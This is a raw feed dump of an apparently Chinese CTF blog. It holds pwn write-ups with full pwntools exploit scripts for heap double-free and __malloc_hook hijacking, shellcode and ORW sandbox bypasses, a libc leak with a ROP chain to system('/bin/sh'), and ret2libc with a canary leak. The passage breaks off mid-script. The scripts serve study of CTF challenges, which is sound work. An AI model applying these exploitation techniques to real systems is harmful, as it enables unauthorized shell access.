class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,25878)</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,idx,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;input index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;input your name:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;new content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input idx :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">2</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">3</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">4</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">5</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0</span>,<span class="string">&#x27;\xb0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">1</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">7</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>))</span><br><span class="line">pause()</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">3</span>,<span class="string">b&#x27;aaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">4</span>,<span class="string">b&#x27;\xdd\x45&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">5</span>,<span class="string">b&#x27;\xdd\x45&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x18cc27</span></span><br><span class="line"><span class="keyword">if</span> leak == -<span class="number">0x3c5600</span>:</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line">p.recv()</span><br><span class="line">lg(<span class="string">&#x27;leak&#x27;</span>,leak)</span><br><span class="line"></span><br><span class="line">one_shell=[<span class="number">0x4525a</span>,<span class="number">0xef9f4</span>,<span class="number">0xf0897</span>]</span><br><span class="line"></span><br><span class="line">shell=leak+one_shell[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc_hook = leak + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">lg(<span class="string">&#x27;malloc&#x27;</span>,malloc_hook)</span><br><span class="line">lg(<span class="string">&#x27;shell&#x27;</span>,shell)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(shell))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn-刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> io_file </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西湖论剑2025 pwn</title>
      <link href="/posts/41345.html"/>
      <url>/posts/41345.html</url>
      
        <content type="html"><![CDATA[<h2 id="Heaven’s-door"><a href="#Heaven’s-door" class="headerlink" title="Heaven’s door"></a>Heaven’s door</h2><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502182030187.png" alt="1"></p><p>题目映射了一段可以可读可写可执行的空间，并且调用执行这段空间</p><p>有两个防御，一个检查syscall只能调用两次，一个沙箱</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502182030530.png" alt="2"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502182030380.png" alt="3"></p><p>因此，有可以直接用shellcraft生成一个提权的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>也可以用ORW （思路和脚本来自<a href="https://blog.csdn.net/AtomTeam/article/details/145229171">2025第八届西湖论剑网络安全技能大赛WriteUp—Pwn篇_西湖论剑初赛2025-CSDN博客</a>）</p><p>没有read 但是可以直接用mmap映射到空间上 ，write函数用\x90占位，然后正常syscall</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">shellcode += asm(shellcraft.mmap(<span class="number">0x20000</span>, <span class="number">0x1000</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">&#x27;rax&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">shellcode += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,0x20000</span></span><br><span class="line"><span class="string">mov rdx,0x50</span></span><br><span class="line"><span class="string">mov byte ptr [rip],0x0f</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>) + <span class="string">b&#x27;\x90\x05&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="vpwn"><a href="#vpwn" class="headerlink" title="vpwn"></a>vpwn</h2><p>啊， 逆c++真是难受啊，还得硬看</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502182030770.png" alt="image-20250217212726127"></p><p>主页是edit push pop printf这四个功能</p><p>先看push函数</p><p><strong><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502182030106.png" alt="image-20250217213042553"></strong></p><p>这里存在一个洞，vector+24是存放result的地方，连续push 7次就会把vector+24地方的改掉成我们输入的数字了</p><p>再看printf_vector这里</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502182030260.png" alt="image-20250217213713936"></p><p>这里是打印小于vector前面的值</p><p>我们这里直接说一下我怎么动调找到泄露数据的libc</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502182030317.png" alt="image-20250218172130555"></p><p>先下断点到push函数</p><p>这里我们输入一个值查看位置</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502182030808.png" alt="image-20250218172323867"></p><p>接着在函数中我们找到了</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502182030817.png" alt="image-20250218172355912"></p><p>根据静态函数的传参</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502182030354.png" alt="image-20250218172243763"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502182030685.png" alt="屏幕截图 2025-02-18 172448"></p><p>这样就可以找到libc，后面就是利用edit劫持这个函数,改成system &#x2F;bin&#x2F;sh</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502182030952.png" alt="image-20250218173031013"></p><p>exp思路来自</p><p><a href="https://blog.csdn.net/AtomTeam/article/details/145229171">2025第八届西湖论剑网络安全技能大赛WriteUp—Pwn篇_西湖论剑2025-CSDN博客</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">num,data</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Enter your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter the index to edit (0-based):&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line">    sla(<span class="string">b&#x27;Enter the new value:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Enter your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter the value to push: &#x27;</span>,<span class="string">b&#x27;11111111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Enter your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Enter the value to push: &#x27;</span>,<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Enter your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;StackVector contents: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">meg = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).split(<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">libc_base = (<span class="built_in">int</span>(meg[<span class="number">19</span>]) &lt;&lt; <span class="number">32</span>) + (<span class="built_in">int</span>(meg[<span class="number">18</span>]) &amp; <span class="number">0xffffffff</span>) - <span class="number">0x29d90</span></span><br><span class="line">lg(<span class="string">&#x27;libc&#x27;</span>,libc_base)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">bin_sh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret=libc_base+<span class="number">0x29139</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2a3e5</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">18</span>, <span class="built_in">str</span>(ret &amp; <span class="number">0xFFFFFFFF</span>).encode())</span><br><span class="line">edit(<span class="number">19</span>, <span class="built_in">str</span>((ret &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>).encode())</span><br><span class="line">edit(<span class="number">20</span>, <span class="built_in">str</span>(pop_rdi &amp; <span class="number">0xFFFFFFFF</span>).encode())</span><br><span class="line">edit(<span class="number">21</span>, <span class="built_in">str</span>((pop_rdi &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>).encode())</span><br><span class="line">edit(<span class="number">22</span>, <span class="built_in">str</span>(bin_sh_addr &amp; <span class="number">0xFFFFFFFF</span>).encode())</span><br><span class="line">edit(<span class="number">23</span>, <span class="built_in">str</span>((bin_sh_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>).encode())</span><br><span class="line">edit(<span class="number">24</span>, <span class="built_in">str</span>(system_addr &amp; <span class="number">0xFFFFFFFF</span>).encode())</span><br><span class="line">edit(<span class="number">25</span>, <span class="built_in">str</span>((system_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>).encode())</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Enter your choice:&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>后面的题等我学完更多的东西再去打吧</p>]]></content>
      
      
      <categories>
          
          <category> ctf-比赛复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>湘岚杯部分wp(pwn)</title>
      <link href="/posts/885.html"/>
      <url>/posts/885.html</url>
      
        <content type="html"><![CDATA[<h1 id="ret2text签到"><a href="#ret2text签到" class="headerlink" title="ret2text签到"></a>ret2text签到</h1><p>签到，没什么好说的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">b&#x27;xlctf.huhstsec.top&#x27;</span>,<span class="number">22903</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">18</span>+p64(<span class="number">0x40115A</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ezlibc"><a href="#ezlibc" class="headerlink" title="ezlibc"></a>ezlibc</h1><p>溢出泄露canary+ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">b&#x27;xlctf.huhstsec.top&#x27;</span>,<span class="number">24021</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/yfy/tools/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;I think it&#x27;s easy to get the flag!&quot;</span>,pay1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line">log.success(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400843</span></span><br><span class="line">ret=<span class="number">0x040059e</span></span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x400764</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Maybe UR closer to the key&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;keep trying\n&#x27;</span>)</span><br><span class="line">leak_addr= u64(p.recvline(<span class="number">6</span>).strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\00&#x27;</span>))</span><br><span class="line"><span class="comment">#leak_addr = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;leak_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>((<span class="built_in">hex</span>)(leak_addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base=leak_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">bin_sh_addr=libc_base+<span 